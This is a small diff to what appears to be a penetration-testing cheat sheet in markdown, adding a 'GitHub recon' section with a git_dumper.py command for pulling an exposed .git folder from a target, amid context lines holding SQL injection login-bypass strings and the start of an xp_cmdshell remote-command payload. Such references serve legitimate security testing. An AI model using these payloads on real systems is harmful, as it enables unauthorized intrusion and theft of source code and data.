@@ -329,6 +329,16 @@ admin' or '1'='1
 ) or '1`='1-
 ```
 
+<details>
+  <summary><strong>GitHub recon</strong></summary>
+
+#### .git file download
+```bash
+python3 git_dumper.py http://<ip>.com/.git /<output_folder>
+```
+
+</details>
+
 ### Windows RCE
 ```ps
 ';exec xp_cmdshell <command>
